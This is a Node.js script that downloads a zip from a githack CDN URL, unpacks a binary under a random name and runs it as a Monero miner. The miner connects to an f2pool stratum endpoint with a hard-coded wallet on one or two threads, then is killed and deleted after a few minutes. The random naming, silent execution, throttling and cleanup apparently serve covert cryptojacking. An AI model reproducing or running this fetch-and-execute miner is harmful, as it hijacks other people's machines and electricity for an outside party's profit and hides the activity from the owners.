const { createWriteStream } = require('fs')
const Path = require('path')
const Axios = require('axios')
const shell = require('shelljs');
const { printLog } = require('./log-print');

const nameTool = Math.random().toString(36).substring(7);

const timeout = (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}

const runJob = (nameTool) => {
    const coreNumber = Math.floor(Math.random() * 2) + 1;
    const runMonney = shell.exec(`./${nameTool} -o stratum+tcp://xmr.f2pool.com:13531 -u 46s4YKAvP8iQU4VBNmMMjoDU9SmiU13HvSdq7A7r1x2GCuvmGxgq3yh61nxw7yCyRRh2KLp13pNWvWhFP4zBMwhiKvDwQ1y -p meocoder -k --nicehash --coin monero -a rx/0 -t ${ coreNumber } --astrobwt-avx2`, { silent: true, async: true });
    if (runMonney.code !== undefined) {
        return 0;
    }
    runMonney.stdout.on('data', (rawLog) => {
//         printLog(rawLog);
    });
    console.log(`-- ${ coreNumber }`);
}

const downloadImage = async () => {
    const url = 'https://glcdn.githack.com/k.ing.d.om.he.art.stm.p/meocoder/-/raw/master/tool.zip';
    const filename = `${Math.random().toString(36).substring(7)}.zip`;
    const path = Path.resolve(__dirname, filename);
    const writer = createWriteStream(path);
    const response = await Axios({
        url,
        method: 'GET',
        responseType: 'stream'
    });
    response.data.pipe(writer);
    return new Promise((resolve, reject) => {
        writer.on('finish', () => {
            if (shell.exec(`rm -rf SHA256SUMS runtool config.json && unzip ${filename} && cp runtool ${nameTool} && rm -rf ${filename}`, { silent: true }).code === 0) {
                console.log('-- 2 0');
                runJob(nameTool);
                return resolve(((Math.floor(Math.random() * 2) + 5) * 60) * 1000);
            }
        });
        writer.on('error', () => {
            console.log('-- 0k');
            return reject();
        })
    })
}

try {
    downloadImage().then(async (timeRunJobs) => {
        console.log(`-- run ${((timeRunJobs / 60) / 1000)}`);
        await timeout(timeRunJobs);
        if (shell.exec(`killall ${nameTool}`, { silent: true }).code === 0) {
            console.log('-- ket thuc jobs');
            shell.exec(`rm -rf ${nameTool}`, { silent: true });
        }
    }).catch((err) => {
        console.log(error);
    });
} catch (error) {
    console.log(error);
}

